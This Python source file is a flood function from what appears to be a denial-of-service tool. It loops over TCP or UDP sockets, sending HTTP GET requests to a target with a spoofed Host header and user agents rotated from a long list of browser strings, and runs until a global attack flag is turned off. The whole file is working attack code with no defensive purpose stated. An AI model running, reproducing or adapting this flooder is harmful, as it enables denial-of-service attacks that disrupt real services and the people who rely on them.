# Flood function

import global_variables
import random
import socket
import time

def flood(target, port, spoof, delay, method):

    user_agents = [
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
        "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
        "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
        "Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15",
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57",
        "Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
        "Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0",
        "Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g",
        "Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)",
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125",
        "Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)",
        "Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413",
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)",
        "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
        "Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)",
        "Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)",
        "Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10",
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4",
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0",
        "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10",
        "Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)",
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
        "Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)"
    ]
    
    while True:

        try:
                
                if method == "tcp": s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if method == "udp": s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                s.connect((target, port))
                s.sendto(("GET / HTTP/1.1\r\n").encode('utf-8'), (target, port))
                s.sendto(("Host: " + spoof + "\r\n").encode('utf-8'), (target, port))
                s.sendto(("User-Agent: " + random.choice(user_agents) + "\r\n\r\n").encode('utf-8'), (target, port))
                
                s.close()

        except:
            
            pass
        
        global_variables.request_index += 1
        
        if global_variables.attack_running == False: break

        time.sleep(delay)